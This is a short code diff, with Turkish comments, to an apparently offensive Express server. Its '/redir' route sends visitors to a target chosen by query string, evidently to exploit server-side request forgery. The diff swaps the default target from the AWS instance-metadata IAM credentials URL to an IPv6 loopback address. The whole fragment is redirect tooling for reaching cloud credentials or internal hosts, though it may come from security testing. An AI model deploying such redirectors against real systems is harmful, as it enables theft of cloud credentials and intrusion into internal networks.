@@ -19,7 +19,7 @@ app.use((req, res, next) => {
 // AWS Metadata veya İç Ağ Yönlendiricisi
 app.get('/redir', (req, res) => {
     // Hedef olarak doğrudan AWS IMDSv1 Metadata adresini veriyoruz:
-    const target = req.query.target || 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+    const target = req.query.target || 'http://[::1]';
     
     console.log(`[!] Metadata Redirect tetiklendi! Hedef: ${target}`);
     
